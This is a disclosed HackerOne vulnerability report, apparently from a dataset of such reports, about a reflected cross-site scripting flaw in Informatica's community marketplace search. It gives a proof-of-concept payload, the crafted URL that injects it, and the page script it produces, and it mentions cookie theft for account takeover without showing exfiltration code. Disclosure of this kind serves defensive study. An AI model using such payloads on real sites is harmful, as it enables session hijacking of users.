---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '47235'
original_report_id: '47235'
title: XSS in Search Communities Function
weakness: Cross-site Scripting (XSS) - Generic
team_handle: informatica
created_at: '2015-02-09T18:51:57.267Z'
disclosed_at: '2015-07-31T23:09:46.281Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# XSS in Search Communities Function

## Metadata

- HackerOne Report ID: 47235
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: informatica
- Disclosed At: 2015-07-31T23:09:46.281Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

When you search for a URL on the communities page, you visit a URL that looks like this
```
https://community.informatica.com/community/marketplace/search/?blkCatIds=free+apps&view=solution
```

By replacing the search query with 
``` html
";alert(0);t="
```

and making the final URL:

```
https://community.informatica.com/community/marketplace/%22;alert(0);t=%22/?blkCatIds=free+apps&view=solution
```

You make the page's javascript code, turn into

``` javascript
        var profileShortUrl = "/profile-short.jspa";
        var profileLoadingTooltip = "Loading user profile";
        var profileErrorTooltip = "There was an error loading that profile information.";

        var projectChooserUrl = "/community/marketplace/";
        alert(0);
        t="/project-chooser!input.jspa";

        var containerShortUrl = "/container-short.jspa";
        var containerLoadingTooltip = "Loading place information.";
        var containerErrorTooltip = "There was an error loading that place information.";

        var videoShortUrl = "/view-video-short.jspa";
        var videoLoadingTooltip = "video.tooltip.loading";
        var videoErrorTooltip = "video.tooltip.error";
        var _jive_video_picker__url = "?container=1&containerType=14";
        var followErrorMessage = "An internal error ocurred while following the project or space.";

        (function() {
            var originalWrite = document.write;
            document.write = function() {
                if(typeof $j != 'undefined' && $j.isReady) {
                    console.warn("document.write called after document was loaded: ", arguments);
                }
                else {
                    // In IE before version 8 `document.write()` does not
                    // implement Function methods, like `apply()`.
                    return Function.prototype.apply.call(originalWrite, document, arguments);
                }
            }
        })();        
```
This is an example of a injected javascript XSS vulnerability. With this, one can also exfiltrtrate user's cookies to another server allowing account takeovers.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
